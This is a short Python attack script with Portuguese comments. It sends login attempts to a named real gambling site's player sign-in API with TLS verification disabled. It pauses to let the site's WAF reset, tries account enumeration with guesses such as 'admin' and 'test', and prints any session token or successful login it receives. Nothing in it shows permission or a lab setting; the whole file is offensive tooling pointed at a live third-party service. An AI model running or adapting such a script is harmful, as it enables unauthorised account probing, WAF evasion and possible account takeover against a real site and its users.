import urllib.request, ssl, json, uuid, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

DEVICE_ID = str(uuid.uuid4()).replace("-","")[:32]
BASE = "https://ds.amizade777.com"

def post_login(phone, pwd):
    data = {
        "appChannel": "pc",
        "appPackageName": "com.slots.big",
        "deviceId": DEVICE_ID,
        "deviceModel": "WEB",
        "deviceVersion": "WEB",
        "appVersion": "1.0.0",
        "sysTimezone": "-180",
        "sysLanguage": "pt-BR",
        "phone": phone,
        "password": pwd,
    }
    body = json.dumps(data).encode()
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0)",
        "Content-Type": "application/json",
    }
    try:
        r = urllib.request.Request(BASE + "/prod-api/player/sign-in", data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            j = json.loads(resp.read(4096).decode())
            return resp.status, j
    except urllib.error.HTTPError as e:
        try:
            j = json.loads(e.read(2048).decode())
            return e.code, j
        except:
            return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

print("Aguardando 8s para o WAF resetar...")
time.sleep(8)

# Testar enumeração: admin vs número real
for phone, pwd in [("admin", "x"), ("13800000000", "x"), ("test", "x")]:
    time.sleep(2)
    st, j = post_login(phone, pwd)
    code = j.get("code", "?")
    msg  = j.get("msg", "")
    token = j.get("data", {}).get("token", "") if isinstance(j.get("data"), dict) else ""
    print(f"phone={phone!r:20s} HTTP={st} code={code} msg={msg!r}")
    if token:
        print(f"  *** TOKEN: {token[:40]}***")
    if code == 200:
        print(f"  *** LOGIN OK: {json.dumps(j, ensure_ascii=False)[:300]}")
